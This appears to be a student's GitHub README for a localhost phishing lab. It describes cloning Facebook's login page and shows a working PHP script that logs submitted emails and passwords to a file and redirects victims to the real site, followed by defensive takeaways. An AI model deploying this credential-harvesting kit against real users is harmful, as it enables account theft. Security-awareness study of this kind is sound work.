# Facebook-phishing-simulation

# Facebook Phishing Simulation — Home Lab Project

> A local phishing simulation replicating a Facebook login page to capture credentials in a controlled home lab environment. Built for educational and security awareness purposes only. All testing conducted on localhost — no external systems involved.

---

## ⚠️ Legal Disclaimer

This project was conducted entirely within a **local home lab environment on localhost (127.0.0.1)**. No real users, external networks, or live systems were targeted. This is strictly for **educational and cybersecurity learning purposes**. Unauthorised phishing is illegal under the Australian Criminal Code Act and equivalent laws worldwide.

---

## Project Overview

This project simulates how a phishing attack works at a technical level by cloning the Facebook login page, hosting it locally, and capturing submitted credentials into a text file. The goal was to understand the mechanics of credential harvesting from a defensive security perspective.

---

## How It Works

```
Target visits fake login page (index.html)
             │
             ▼
Enters email and password → clicks Sign In
             │
             ▼
Form POSTs to login.php
             │
             ▼
PHP writes credentials to cred.txt
             │
             ▼
Target redirected to real facebook.com
             │
             ▼
Attacker monitors cred.txt in real time via tail -f
```

---

## Project Structure

```
fb_phishing/
├── index.html     # Cloned Facebook login page
├── login.php      # Credential capture script
└── cred.txt       # Output file storing captured credentials
```

---

## Step-by-Step Build

### 1. Clone the Facebook Login Page

- Opened `facebook.com` in browser
- Right-clicked → **View Page Source**
- Copied the full HTML source code
- Saved it as `index.html` inside the `fb_phishing` folder
- Located the form action pointing to `www.facebook.com/login.php`
- Changed it to `login.php` (pointing to local capture script)

### 2. Create the Credential Capture Script

Created `login.php` with the following code:

```php
<?php
file_put_contents("cred.txt", "Login : ". $_POST['email']. " Password : ".  $_POST['pass'] . "\n", 
FILE_APPEND);
header ('Location: https://facebook.com/');
exit ();
?>
```

**What each line does:**
- `file_put_contents` — writes the submitted email and password to `cred.txt`
- `FILE_APPEND` — adds each new entry to the file without overwriting previous ones
- `header('Location')` — redirects the target to the real Facebook after capture
- `exit()` — stops script execution after redirect

### 3. Create the Output File

```bash
touch cred.txt
```

### 4. Folder Structure Confirmed

All three files placed in one directory:

```
~/Desktop/fb_phishing/
├── cred.txt
├── index.html
└── login.php
```

### 5. Start the Local PHP Server

```bash
php -S 127.0.0.1:80
```

This starts PHP's built-in development server on localhost port 80. The phishing page is now accessible at `http://127.0.0.1`.

### 6. Monitor Captured Credentials in Real Time

Opened a second terminal tab and ran:

```bash
tail -f cred.txt
```

This streams new entries live as credentials are submitted.

---

## Result

Successfully captured test credentials in real time:

```
Login : sammy Password : samlovestoeat
```

The target was immediately redirected to the real `facebook.com` after submitting — making the attack transparent from the user's perspective.

---

## Network Configuration

```
eth0:  10.0.2.5          (NAT adapter)
eth1:  192.168.56.103    (Host-Only adapter)
lo:    127.0.0.1         (Localhost — server ran here)
```

The PHP server was bound exclusively to `127.0.0.1` — completely isolated to localhost, no external exposure.

---

## Key Concepts Demonstrated

| Concept | Detail |
|---------|--------|
| HTML form hijacking | Redirecting form action from real site to local capture script |
| PHP credential logging | Writing POST data to a file with FILE_APPEND |
| Transparent redirect | Sending target to real site after capture |
| Real-time monitoring | Using `tail -f` to watch captures live |
| Isolated lab environment | Server bound to 127.0.0.1 only |

---

## Tools Used

- **Kali Linux** — lab environment
- **PHP 8.4.4** built-in development server
- **gedit** — text editor for writing login.php
- **Thunar** — file manager for folder organisation
- **Terminal** — server execution and real-time monitoring

---

## Defensive Takeaways

Understanding how this attack works from the offensive side directly informs how to defend against it:

- **HTTPS indicators** — users should verify the padlock and domain before entering credentials
- **Password managers** — auto-fill only works on legitimate domains, preventing credential submission to clones
- **MFA** — even if credentials are captured, a second factor blocks account access
- **Security awareness training** — the most effective defence is users knowing what phishing looks like

---

## Author

Swayam Patel — Cybersecurity Student, La Trobe University  
GitHub: github.com/S4mmy1604
